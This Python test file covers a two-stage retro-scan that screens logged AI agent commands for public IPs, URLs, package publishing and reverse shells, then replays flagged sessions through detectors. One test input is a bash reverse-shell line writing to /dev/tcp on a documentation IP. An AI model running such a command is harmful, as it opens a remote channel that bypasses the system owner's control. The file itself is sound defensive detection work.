"""Tests for two-stage ledger retro-scan (ant.md P1 #4)."""

from __future__ import annotations

from datetime import datetime, timezone
from types import SimpleNamespace
from uuid import UUID, uuid4

from agenttrace.graph.retro_scan import RetroScan, RetroScanReport, stage1_screen
from agenttrace.models.events import (
    CommandEvent,
    ConfidenceLevel,
    EventBase,
    FileMutationEvent,
)

_SID = uuid4()
_T0 = datetime(2026, 8, 30, 12, 0, 0, tzinfo=timezone.utc)


def _cmd(command: str, output: str = "") -> CommandEvent:
    return CommandEvent(
        session_id=_SID,
        actor_id="agent",
        source_adapter="claude_code",
        confidence=ConfidenceLevel.LOW,
        command=command,
        output=output,
        timestamp=_T0,
    )


# -- stage1_screen --------------------------------------------------------------


def test_stage1_flags_public_ip_and_url() -> None:
    """The wide-net patterns that found the report's fourth incident."""
    events = [
        _cmd("echo done", output="scan of 203.0.113.9 finished"),
        _cmd("curl https://pypi.org/simple/ -o /dev/null"),
    ]
    hits = stage1_screen(events, _SID)
    names = {h.pattern_name for h in hits}
    assert "public_ip" in names
    assert "url" in names
    assert all(h.session_id == _SID for h in hits)


def test_stage1_flags_publish_and_reverse_shell() -> None:
    events = [
        _cmd("twine upload dist/*"),
        _cmd("bash -c 'cat <&0 > /dev/tcp/203.0.113.9/4444'"),
    ]
    names = {h.pattern_name for h in stage1_screen(events, _SID)}
    assert "registry_publish" in names
    assert "reverse_shell" in names


def test_stage1_ignores_derived_evidence() -> None:
    """Derived events (agent-internal narratives) are excluded from triage."""
    finding = FileMutationEvent(
        session_id=_SID,
        actor_id="observer",
        source_adapter="filesystem_observer",
        confidence=ConfidenceLevel.HIGH,
        path="C:\\work\\note.txt",
        operation="write",
        timestamp=_T0,
    )
    assert stage1_screen([finding], _SID) == []



# -- RetroScan end-to-end with a stub ledger + stub engine ----------------------


class _StubLedger:
    def __init__(self, sessions: dict[uuid4, list[EventBase]]) -> None:
        self._sessions = sessions

    def list_sessions(self) -> list[dict[str, object]]:
        return [{"session_id": str(sid)} for sid in self._sessions]

    def query_events(self, session_id, after=None, limit=None):
        if after is not None:
            return []
        return self._sessions.get(session_id, [])[: limit or None]


def test_retro_scan_two_stage_pipeline() -> None:
    """Stage-1 hit promotes a session to stage-2 detector replay."""
    flagged = _cmd("deploy", output="pushed to 203.0.113.9 via https://x.test")
    clean = _cmd("ls")
    sid_clean = uuid4()
    ledger = _StubLedger({_SID: [flagged], sid_clean: [clean]})
    engines_built: list = []

    def factory(sid):
        engines_built.append(sid)

        class _Engine:
            def evaluate(self, event):
                return []

        return _Engine()

    report = RetroScan(ledger).scan(engine_factory=factory)
    assert report.sessions_scanned == 2
    assert report.stage1_hits and report.stage1_hits[0].pattern_name == "public_ip"
    assert engines_built == [_SID]  # only the flagged session reached stage 2
    assert sid_clean not in report.sessions_stage2
    assert not report.errors
    assert "0 retro incidents" in report.summary()


def test_retro_scan_findings_become_incidents_and_errors_fail_closed() -> None:
    flagged = _cmd("x", output="contact 203.0.113.9")
    sid_err = uuid4()

    class _BadLedger(_StubLedger):
        def query_events(self, session_id: UUID, after=None, limit=None):
            if session_id == sid_err:
                raise RuntimeError("db locked")
            return super().query_events(session_id, after, limit)

    ledger = _BadLedger({_SID: [flagged], sid_err: []})

    class _Engine:
        def __init__(self, sid):
            self._sid = sid

        def evaluate(self, event):
            return [SimpleNamespace(
                detector_id="RETRO_TEST",
                severity="medium",
                description="retro finding",
            )]

    report = RetroScan(ledger).scan(engine_factory=lambda sid: _Engine(sid))
    assert report.retro_incidents, "finding must map to a retro incident"
    inc = report.retro_incidents[0]
    assert inc.session_id == _SID
    assert inc.incident_type == "retro_RETRO_TEST"
    assert "retro finding" in inc.description
    assert str(flagged.event_id) in inc.related_events
    assert "RuntimeError" in "".join(report.errors)
    assert isinstance(report, RetroScanReport)
